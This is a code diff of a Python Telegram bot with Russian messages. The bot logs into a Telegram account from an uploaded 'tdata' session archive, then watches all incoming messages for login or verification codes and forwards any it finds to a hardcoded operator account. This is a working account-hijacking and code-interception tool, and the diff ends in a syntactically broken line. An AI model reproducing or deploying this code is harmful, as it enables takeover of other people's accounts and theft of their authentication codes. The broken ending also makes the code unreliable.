@@ -1,20 +1,6 @@
 import os
 import zipfile
 import asyncio
-from flask import Flask, request
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from opentele.tdata import TData
-import os
-import zipfile
-import asyncio
-from flask import Flask, request
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from opentele.tdata import TData
-import os
-import zipfile
-import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from opentele.tdata import TData
@@ -26,7 +12,7 @@ MY_ID = 8617048286
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != MY_ID:
         return
-    await update.message.reply_text("👋 Привет! Отправь мне ZIP-архив с папкой tdata, и я заступлю на дежурство за кодами.")
+    await update.message.reply_text("Привет! Отправь архив tdata.")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != MY_ID:
@@ -34,10 +20,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     doc = update.message.document
     if not doc.file_name.endswith('.zip'):
-        await update.message.reply_text("❌ Пожалуйста, отправь папку tdata, запакованную в .zip архив!")
+        await update.message.reply_text("Нужен ZIP-архив!")
         return
 
-    msg = await update.message.reply_text("⏳ Скачиваю архив и настраиваю сессию...")
+    msg = await update.message.reply_text("Скачиваю...")
     
     zip_path = "user_tdata.zip"
     extract_dir = "extracted_tdata"
@@ -59,35 +45,26 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = await td.ToTelethon()
         await client.connect()
         
-        await msg.edit_text("✅ Вход по tdata выполнен успешно! Запускаю отслеживание кодов...")
+        await msg.edit_text("Сессия активна! Жду коды...")
 
         @client.on(events.NewMessage)
         async def catch_codes(event):
             text = event.raw_text.lower()
-            keywords = ["код", "code", "авторизац", "вход", "login", "password"]
-            
-            if any(word in text for word in keywords):
-                sender = await event.get_sender()
-                sender_name = getattr(sender, 'title', None) or getattr(sender, 'first_name', 'Неизвестно')
-                
+            if any(w in text for w in ["код", "code", "авторизац", "вход", "login"]):
                 await context.bot.send_message(
                     chat_id=MY_ID,
-                    text=f"🔑 **Пришел код!**\n\nОт: {sender_name}\nТекст:\n{event.raw_text}"
+                    text=f"Код:\n{event.raw_text}"
                 )
 
         asyncio.create_task(client.run_until_disconnected())
 
     except Exception as e:
-        await msg.edit_text(f"❌ Ошибка при входе через tdata: {e}")
+        await msg.edit_text(f"Ошибка: {e}")
 
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    
-    print("Бот-менеджер запущен...")
-    app.run_polling()
+app = Application.builder().token(BOT_TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-if __name__ == '__main__
-':
-    main()
+if __name__ == "__main__":
+    app.
+    run_polling()
